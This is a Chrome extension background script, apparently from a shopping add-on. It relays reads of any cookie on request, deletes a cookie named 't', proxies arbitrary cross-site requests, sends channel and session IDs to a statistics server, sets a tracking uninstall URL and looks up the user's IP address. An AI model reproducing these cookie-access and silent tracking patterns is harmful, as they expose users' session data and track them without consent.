if (!localStorage.channelId1013) {
    if (typeof newCid != "undefined") {
        localStorage.channelId1013 = newCid;
    } else {
        localStorage.channelId1013 = "";
    }
}
var cid = localStorage.channelId1013;
chrome.storage.local.set({dypCanalId20180709:cid});
//中转页面
var plusUpdateUrl;
function removeCookie(u,c) {
    chrome.cookies.remove({url:u,name:c.name});
}
chrome.extension.onMessage.addListener(function (request,sender,sendResponse) {
    if (request.name == "getCook") {
        chrome.cookies.getAll({
            url:request.url,
            name:request.key
        },function (b) {
            sendResponse(b);
        });
    } else if (request.name == "clearCook") {
        chrome.cookies.get({
            url:request.url,
            name:"t"
        },function (b) {
            if (b && b.name) {
                removeCookie(request.url,b);
            }
            sendResponse("1");
        });
    } else if (request.name == "universal") {
        $.ajax({
            type:request.type,
            url:request.url,
            dataType:request.dataType,
            data:request.data,
            timeout:5000,
            success:function (e) {
                sendResponse(e);
            },error:function () {
                sendResponse("");
            }
        });
    }
    return true;
});
//判断当前浏览器类型
function statisApi() {
    if (!(document.cookie.indexOf("newdailyActivity") > -1)) {
        var lefttime = setLeftTime(5);
        document.cookie = "newdailyActivity=" + escape(cid) + ";expires=" + lefttime.toGMTString();
        var sid1 = localStorage.sid1 ? localStorage.sid1 : 0;
        var t1 = localStorage.t1 ? localStorage.t1 : 0;
        $.ajax({
            url:"https://ext.statis.xixixihaha.com/index/Commoninterface/statisticsPlug",
            type:"post",
            data:{sid:sid1,t:t1,cid:cid},
            dataType:"json",
            success:function (data) {
                if (data.sid) {
                    localStorage.sid1 = data.sid;
                }
                if (data.t) {
                    localStorage.t1 = data.t;
                }
            }
        });
    }
}   //
function setLeftTime(time) {
    var curDate = new Date();
    var curTamp = curDate.getTime();
    var leftTamp = time * 1000;
    var leftTime = new Date();
    leftTime.setTime(leftTamp + curTamp);
    return leftTime;
}
statisApi();
chrome.runtime.setUninstallURL("https://ext.statis.xixixihaha.com/uninstall.php?cid=" + cid);
chrome.storage.local.get(null,function (e) {
    if (!e.dypIp20180308) {
        $.ajax({
            url:"http://2018.ip138.com/ic.asp",
            dataType:"html",
            success:function (d) {
                chrome.storage.local.set({dypIp20180308:d});
            }
        });
    }
});